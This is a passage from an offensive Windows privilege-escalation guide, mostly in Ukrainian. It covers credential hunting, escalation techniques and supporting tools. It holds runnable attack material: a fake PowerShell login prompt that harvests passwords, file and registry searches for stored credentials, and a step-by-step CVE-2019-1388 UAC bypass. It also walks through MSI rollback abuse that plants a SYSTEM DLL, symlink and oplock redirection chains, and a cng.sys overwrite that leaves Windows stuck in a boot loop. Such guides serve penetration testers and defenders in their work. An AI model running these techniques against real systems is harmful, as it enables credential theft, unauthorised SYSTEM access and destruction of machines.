Ви завжди можете **попросити користувача ввести його облікові дані або навіть облікові дані іншого користувача**, якщо вважаєте, що він може їх знати (зауважте, що **запитувати** їх безпосередньо у **клієнта** — це дуже **ризиковано**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Можливі імена файлів, що містять облікові дані**

Відомі файли, які деякий час тому містили **паролі** у **clear-text** або **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Пошукайте всі запропоновані файли:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Облікові дані в RecycleBin

Також слід перевірити Bin, щоб пошукати всередині нього облікові дані

Щоб **відновити паролі**, збережені кількома програмами, ви можете використати: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Витягніть openssh keys з registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Слід перевірити dbs, де зберігаються passwords від **Chrome або Firefox**.\
Також перевірте history, bookmarks і favourites браузерів, можливо, там зберігаються деякі **passwords**.

Tools для витягування passwords з браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка дозволяє **intercommunication** між software components різних мов. Кожен COM component **ідентифікується за class ID (CLSID)** і кожен component надає функціональність через один або кілька interfaces, які ідентифікуються за interface IDs (IIDs).

COM classes і interfaces визначені в registry під **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface** відповідно. Цей registry створюється шляхом об’єднання **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Усередині CLSIDs цього registry можна знайти дочірній registry **InProcServer32**, який містить **default value**, що вказує на **DLL**, і значення **ThreadingModel**, яке може бути **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) або **Neutral** (Thread Neutral).

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

По суті, якщо ви можете **overwrite будь-яку з DLLs**, які будуть executed, ви можете **escalate privileges**, якщо ця DLL буде executed іншим user.

Щоб дізнатися, як attackers використовують COM Hijacking як механізм persistence, перевірте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Пошук файлу з певною назвою**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Пошук у реєстрі назв ключів і паролів**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Інструменти, що шукають паролі

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли, що містять паролі, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення пароля з системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **sessions**, **usernames** і **passwords** для кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Уявіть, що **процес, що працює як SYSTEM, відкриває новий процес** (`OpenProcess()`) **з повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **з низькими привілеями, але успадковуючи всі відкриті handles головного процесу**.\
Тоді, якщо ви маєте **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий handle до привілейованого процесу, створений** з `OpenProcess()`, і **інжектити shellcode**.\
[Прочитайте цей приклад, щоб дізнатися більше про **те, як виявити та експлуатувати цю вразливість**.](leaked-handle-exploitation.md)\
[Прочитайте **цей інший пост для більш повного пояснення того, як тестувати та зловживати іншими відкритими handlers процесів і потоків, успадкованими з різними рівнями прав (не лише повний доступ)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Спільні сегменти пам’яті, які називають **pipes**, забезпечують взаємодію процесів і передачу даних.

Windows надає функцію **Named Pipes**, яка дозволяє непов’язаним процесам ділитися даними, навіть у різних мережах. Це нагадує client/server архітектуру, де ролі визначені як **named pipe server** і **named pipe client**.

Коли дані надсилаються через pipe **client**, **server**, який налаштував pipe, може **прийняти на себе ідентичність** **client**, якщо має необхідні права **SeImpersonate**. Виявлення **привілейованого процесу**, який взаємодіє через pipe, який ви можете імітувати, дає можливість **отримати вищі привілеї**, перейнявши ідентичність цього процесу, коли він взаємодіє з pipe, який ви створили. Інструкції щодо виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наступний інструмент дозволяє **перехоплювати named pipe communication за допомогою інструмента на кшталт burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **і цей інструмент дозволяє перелічувати та переглядати всі pipes, щоб знаходити privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований client може зловживати шляхом async event на основі mailslot, щоб перетворити `ClientAttach` на довільний **4-byte write** у будь-який існуючий файл, доступний для запису `NETWORK SERVICE`, а потім отримати права Telephony admin і завантажити довільний DLL як service. Повний потік:

- `ClientAttach` із `pszDomainUser`, встановленим у шлях до існуючого файлу, який можна записувати → service відкриває його через `CreateFileW(..., OPEN_EXISTING)` і використовує для async event writes.
- Кожна подія записує контрольований атакувальником `InitContext` з `Initialize` у цей handle. Зареєструйте line app з `LRegisterRequestRecipient` (`Req_Func 61`), спровокуйте `TRequestMakeCall` (`Req_Func 121`), отримайте через `GetAsyncEvents` (`Req_Func 0`), потім скасуйте реєстрацію/завершіть роботу, щоб повторювати детерміновані записи.
- Додайте себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, перепідключіться, потім викличте `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` як `NETWORK SERVICE`.

Більше деталей:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Protocol handler / ShellExecute abuse via Markdown renderers

Клікабельні Markdown links, передані до `ShellExecuteExW`, можуть запускати небезпечні URI handlers (`file:`, `ms-appinstaller:` або будь-яку зареєстровану scheme) і виконувати файли, контрольовані атакувальником, від імені поточного user. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

Коли ви отримуєте shell як user, можуть існувати scheduled tasks або інші процеси, які виконуються і **передають credentials у command line**. Скрипт нижче захоплює command lines процесів кожні дві секунди і порівнює поточний стан з попереднім, виводячи будь-які відмінності.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Викрадення паролів із процесів

## Від Low Priv User до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через console або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити terminal або будь-який інший process, наприклад "NT\AUTHORITY SYSTEM", від unprivileged user.

Це дає змогу підвищити привілеї та обійти UAC одночасно за допомогою тієї самої vulnerability. Додатково, немає потреби нічого встановлювати, а binary, який використовується під час процесу, підписаний і виданий Microsoft.

Деякі з уражених systems такі:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Щоб експлуатувати цю вразливість, необхідно виконати такі кроки:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## З `Administrator Medium` до `High Integrity Level` / UAC Bypass

Прочитайте це, щоб **дізнатися про Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## З довільного видалення/переміщення/перейменування папки до SYSTEM EoP

Техніка, описана [**у цьому blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), з exploit code [**доступним тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Атака по суті полягає в зловживанні механізмом rollback у Windows Installer, щоб під час процесу uninstall замінити легітимні файли шкідливими. Для цього атакеру потрібно створити **malicious MSI installer**, який буде використано для перехоплення папки `C:\Config.Msi`, а потім Windows Installer використовуватиме її для збереження rollback-файлів під час uninstall інших MSI-пакетів, де rollback-файли будуть змінені так, щоб містити malicious payload.

Стислий опис техніки такий:

1. **Stage 1 – Підготовка до перехоплення (залишити `C:\Config.Msi` порожньою)**

- Крок 1: Встановити MSI
- Створіть `.msi`, який встановлює нешкідливий файл (наприклад, `dummy.txt`) у writable folder (`TARGETDIR`).
- Позначте інсталятор як **"UAC Compliant"**, щоб **non-admin user** міг його запустити.
- Залиште **handle** відкритим для файлу після встановлення.

- Крок 2: Почати uninstall
- Видаліть той самий `.msi`.
- Процес uninstall починає переміщати файли до `C:\Config.Msi` і перейменовувати їх у `.rbf` files (rollback backups).
- **Poll open file handle** за допомогою `GetFinalPathNameByHandle`, щоб виявити момент, коли файл стає `C:\Config.Msi\<random>.rbf`.

- Крок 3: Custom Syncing
- `.msi` містить **custom uninstall action (`SyncOnRbfWritten`)**, яка:
- Сигналізує, коли `.rbf` записано.
- Потім **чекає** на іншу подію перед продовженням uninstall.

- Крок 4: Заблокувати видалення `.rbf`
- Коли отримано сигнал, **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **запобігає його видаленню**.
- Потім **пошліть сигнал назад**, щоб uninstall міг завершитися.
- Windows Installer не може видалити `.rbf`, і оскільки він не може видалити весь вміст, **`C:\Config.Msi` не видаляється**.

- Крок 5: Вручну видалити `.rbf`
- Ви (attacker) вручну видаляєте файл `.rbf`.
- Тепер **`C:\Config.Msi` порожня**, готова до перехоплення.

> На цьому етапі **trigger SYSTEM-level arbitrary folder delete vulnerability** для видалення `C:\Config.Msi`.

2. **Stage 2 – Заміна rollback scripts на malicious ones**

- Крок 6: Відтворити `C:\Config.Msi` зі слабкими ACLs
- Створіть папку `C:\Config.Msi` самостійно.
- Встановіть **weak DACLs** (наприклад, Everyone:F) і **залиште handle відкритим** з `WRITE_DAC`.

- Крок 7: Запустити ще одну установку
- Встановіть `.msi` знову, з:
- `TARGETDIR`: Writable location.
- `ERROROUT`: Змінна, яка викликає примусовий збій.
- Ця установка буде використана для повторного trigger **rollback**, який читає `.rbs` та `.rbf`.

- Крок 8: Monitor для `.rbs`
- Використовуйте `ReadDirectoryChangesW`, щоб monitor-ити `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
- Захопіть його filename.

- Крок 9: Sync перед rollback
- `.msi` містить **custom install action (`SyncBeforeRollback`)**, яка:
- Сигналізує про подію, коли `.rbs` створено.
- Потім **чекає** перед продовженням.

- Крок 10: Повторно застосувати слабкі ACL
- Після отримання події `.rbs created`:
- Windows Installer **повторно застосовує strong ACLs** до `C:\Config.Msi`.
- Але оскільки ви все ще маєте handle з `WRITE_DAC`, ви можете **знову застосувати weak ACLs**.

> ACLs **enforced only on handle open**, тому ви все ще можете записувати до папки.

- Крок 11: Drop fake `.rbs` and `.rbf`
- Перезапишіть файл `.rbs` **fake rollback script**, який наказує Windows:
- Відновити ваш `.rbf` файл (malicious DLL) у **privileged location** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop ваш fake `.rbf`, що містить **malicious SYSTEM-level payload DLL**.

- Крок 12: Trigger rollback
- Пошліть сигнал sync event, щоб інсталятор продовжив.
- **type 19 custom action (`ErrorOut`)** налаштована на **навмисний збій інсталяції** у відомий момент.
- Це спричиняє **rollback**.

- Крок 13: SYSTEM installs your DLL
- Windows Installer:
- Читає ваш malicious `.rbs`.
- Копіює ваш `.rbf` DLL у target location.
- Тепер у вас є **malicious DLL у SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Запустіть trusted **auto-elevated binary** (наприклад, `osk.exe`), який завантажує DLL, що ви перехопили.
- **Boom**: Ваш code виконується **as SYSTEM**.


### З довільного видалення/переміщення/перейменування файлу до SYSTEM EoP

Основна MSI rollback техніка (попередня) припускає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша vulnerability дозволяє лише **arbitrary file deletion** ?

Ви могли б експлуатувати **NTFS internals**: кожна папка має прихований alternate data stream під назвою:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Цей stream зберігає **індексні метадані** теки.

Тож, якщо ви **видалите stream `::$INDEX_ALLOCATION`** теки, NTFS **видалить всю теку** з файлової системи.

Ви можете зробити це, використовуючи стандартні API видалення файлів, такі як:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Навіть якщо ви викликаєте API видалення *file*, воно **видаляє саму folder**.

### From Folder Contents Delete to SYSTEM EoP
Що якщо ваша primitive не дозволяє вам видаляти довільні files/folders, але **дозволяє видалення *contents* папки, контрольованої attacker-ом**?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- The oplock **pauses execution** when a privileged process tries to delete `file1.txt`.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Крок 3: Запустіть процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він досягає `file1.txt`, **oplock спрацьовує** і передає керування вашому callback.

4. Крок 4: Усередині callback oplock – перенаправте видалення

- Варіант A: Перемістіть `file1.txt` в інше місце
- Це спорожнює `folder1` без порушення oplock.
- Не видаляйте `file1.txt` напряму — це передчасно звільнить oplock.

- Варіант B: Перетворіть `folder1` на **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Це націлено на внутрішній NTFS stream, який зберігає метадані папки — його видалення видаляє папку.

5. Step 5: Release the oplock
- SYSTEM process continues and tries to delete `file1.txt`.
- But now, due to the junction + symlink, it's actually deleting:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` видалено від SYSTEM.

### From Arbitrary Folder Create to Permanent DoS

Експлуатуйте primitive, що дає змогу **створити довільну папку як SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі permissions**.

Створіть **папку** (не файл) з назвою **critical Windows driver**, наприклад:
```
C:\Windows\System32\cng.sys
```
- Цей шлях зазвичай відповідає kernel-mode драйверу `cng.sys`.
- Якщо **попередньо створити його як папку**, Windows не може завантажити фактичний драйвер під час boot.
- Потім Windows намагається завантажити `cng.sys` під час boot.
- Він бачить папку, **не може визначити фактичний драйвер**, і **крашиться або зупиняє boot**.
- **Немає fallback**, і **немає recovery** без зовнішнього втручання (наприклад, boot repair або disk access).

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

Коли **privileged service** записує logs/exports у path, прочитаний із **writable config**, перенаправте цей path за допомогою **Object Manager symlinks + NTFS mount points**, щоб перетворити privileged write на arbitrary overwrite (навіть **без** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Config, що зберігає target path, є writable для attacker (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити mount point до `\RPC Control` і OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- Privileged operation, що записує в цей path (log, export, report).

**Example chain**
1. Зчитати config, щоб відновити privileged log destination, наприклад `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправити path без admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Зачекайте, поки привілейований компонент запише log (наприклад, admin запускає "send test SMS"). Запис тепер потрапляє в `C:\Windows\System32\cng.sys`.
4. Перевірте перезаписану ціль (hex/PE parser), щоб підтвердити corruption; reboot примусово змушує Windows завантажити підмінений шлях до driver → **boot loop DoS**. Це також узагальнюється на будь-який protected file, який привілейований service відкриє для write.

> `cng.sys` зазвичай завантажується з `C:\Windows\System32\drivers\cng.sys`, але якщо копія існує в `C:\Windows\System32\cng.sys`, вона може бути спробована першою, що робить її надійним DoS sink для corrupt data.



## **From High Integrity to System**

### **New service**

Якщо ви вже працюєте в process з High Integrity, **path до SYSTEM** може бути простим: просто **створити та виконати new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> When creating a service binary make sure it's a valid service or that the binary performs the necessary actions to fast as it'll be killed in 20s if it's not a valid service.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges (probably you will find this in an already High Integrity process), you will be able to **open almost any process** (not protected processes) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.\
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** (_yes, you can find SYSTEM processes without all the token privileges_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client (the service) obtaining SYSTEM privileges.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray gathered passwords across domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is a PowerShell ADIDNS/LLMNR/mDNS spoofer and man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Search for known privesc vulnerabilities (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Search for known privesc vulnerabilities (needs to be compiled using VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerates the host searching for misconfigurations (more a gather info tool than privesc) (needs to be compiled) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extracts credentials from lots of softwares (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port of PowerUp to C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Check for misconfiguration (executable precompiled in github). Not recommended. It does not work well in Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Check for possible misconfigurations (exe from python). Not recommended. It does not work well in Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool created based in this post (it does not need accesschk to work properly but it can use it).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Reads the output of **systeminfo** and recommends working exploits (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Reads the output of **systeminfo** andrecommends working exploits (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
